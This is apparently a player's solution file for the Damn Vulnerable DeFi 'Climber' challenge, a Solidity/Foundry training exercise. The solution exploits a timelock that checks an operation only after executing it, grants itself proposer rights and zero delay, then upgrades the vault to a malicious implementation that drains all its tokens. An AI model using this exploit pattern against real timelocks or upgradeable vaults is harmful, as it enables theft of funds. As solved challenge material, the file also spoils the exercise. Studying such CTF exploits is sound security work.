// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer"); // 
    address player = makeAddr("player"); // MOM LOOK! this is mee!!
    address proposer = makeAddr("proposer"); // can schedule actions that can be executed 1 hour later.
    address sweeper = makeAddr("sweeper"); // powers to sweep all tokens in case of an emergency.
    address recovery = makeAddr("recovery"); // I work for this guy, any time I find money I have to give it to him🙄

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock; // vault owner, It can withdraw a limited amount of tokens every 15 days.
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    // Cool upgradeable vuls 
    // - Logic executed on the constructor will not be reflected in the proxy, because it is executed on the deployment, not through delegatecall, for that we need an initialize function -> @q constant are stored in proxy?
    // - Take special attention if inherited contracts has a storage gap. If not, if you add a new variable to a contract, it would take the slot of the next slot on the proxy -> this is the why is recomended use upgrade-safe contracts

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public 
    checkSolvedByPlayer 
    {
        // 1. Deploy Proposer
        Proposer proposerContract = new Proposer();

        // 2. Prepare targets
        address[] memory targets = new address[](3);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(proposerContract);

        // 3. Prepare values
        uint256[] memory values = new uint256[](3); // all 0s 

        // 4. Prepare salt
        bytes32 salt  = '1'; 

        // 5. Prepare data for calls
        // a) Grant to proposer contract PROPOSER_ROLE
        // b) set the updateDelay of timelock to 0, so proposed actions can be executed inmediatly (OperationState == ReadyForExecution)
        // c) To avoid `execute` to revert, we propose this current action, so when it checks for the id and it's state, this action will be already registered (lack of CEI pattern)
        // at this point, the proposer contract can propose any action over the vault. 
        // SO it propose an upgrade to a new malicious contract, with a `recoverFunds` that will transfer the funds of the vault to the recovery address.
        bytes memory grantRoleData = abi.encodeWithSignature('grantRole(bytes32,address)', PROPOSER_ROLE,address(proposerContract));
        bytes memory updateDelayData = abi.encodeWithSignature('updateDelay(uint64)', 0); // lows can prevent highs -> if this would have a 0 check this attack would be not possible
        bytes memory proposerData = abi.encodeWithSignature(
            'propose(address,address[],uint256[],bytes32)',
            address(timelock),
            targets,
            values,
            salt
        );
        // ^^
        bytes[] memory dataElements = new bytes[](3);
        dataElements[0] = grantRoleData;
        dataElements[1] = updateDelayData;
        dataElements[2] = proposerData; // without calls data, to avoid circular dependencies btw dataElements and proposerData

        // 6. set the call data that will be sended to schedule 
        proposerContract.setCallsData(dataElements);
        timelock.execute(targets, values, dataElements, salt);
        
        /// take funds
        proposerContract.attack(timelock, address(vault), token, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}


contract Proposer {

    bytes[] realCallsData;

    function setCallsData(bytes[] memory rde) public {
        realCallsData = rde;
    }

    function propose(
        ClimberTimelock timelock,
        address[] memory targets,
        uint256[] memory values,
        bytes32 salt
    ) public {
        timelock.schedule(
            targets,
            values,
            realCallsData,
            salt
        );
    }

    function attack(ClimberTimelock timelock, address vault, DamnValuableToken token, address recovery) public {
        // Deploy malicious contract
        MaliciousImplementation maliciousImplementation = new MaliciousImplementation();

        address[] memory targets = new address[](1);
        targets[0] = vault;
        uint256[] memory values = new uint256[](1);

        bytes[] memory callsData = new bytes[](1);
        callsData[0] = abi.encodeWithSignature(
            // upgradeToAndCall(address newImplementation, bytes memory data)
            'upgradeToAndCall(address,bytes)',
            address(maliciousImplementation),
            abi.encodeCall(MaliciousImplementation.recoverFunds, (token, recovery)) // executed on initialization 
        );
        
        bytes32 salt = '1';
        
        timelock.schedule(
            targets,
            values,
            callsData,
            salt
        );

        timelock.execute(targets, values, callsData, salt);
    }
}

contract MaliciousImplementation is ClimberVault {
    function recoverFunds(DamnValuableToken token, address recovery) public {
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}